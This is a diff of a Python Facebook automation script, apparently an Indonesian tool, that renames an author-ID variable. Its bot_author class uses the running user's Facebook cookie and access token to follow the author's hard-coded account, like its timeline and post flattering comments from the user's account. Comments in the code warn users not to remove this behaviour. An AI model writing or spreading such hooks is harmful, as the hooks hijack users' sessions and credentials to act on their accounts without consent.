@@ -1,10 +1,8 @@
 # Gak Usah Di Recode Buat Apa Juga Lol #
 ###----------[ AUTHOR & CREATOR ]---------- ###
-Denventa_F = 100013275378835
-Postingan = 1624764771309353
+Denventa_Afrliyan_Ferly_Khurayra_Shishigami_X = 100013275378835
 Version   = '0.4'
-Facebook_Dev = 'Afriliyan Ferly Shishigami X'
-Instagram_Dev = 'Instagram.com/afriliyanferlly_shishigami'
+Postingan = 1624764771309353
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
 Author    = 'Dapunta Khurayra X'
@@ -151,7 +149,7 @@ def language(cookie):
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa_F)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus Master\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa_Afrliyan_Ferly_Khurayra_Shishigami_X)];self.komen = ['Keren Master\n- [ @[100013275378835:0] ] -','Semangat Terus Master\n- [ @[100013275378835:0] ] -','Gokil Suhu','Panutanku Nih Bro\n- [ @[100013275378835:0] ] -']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
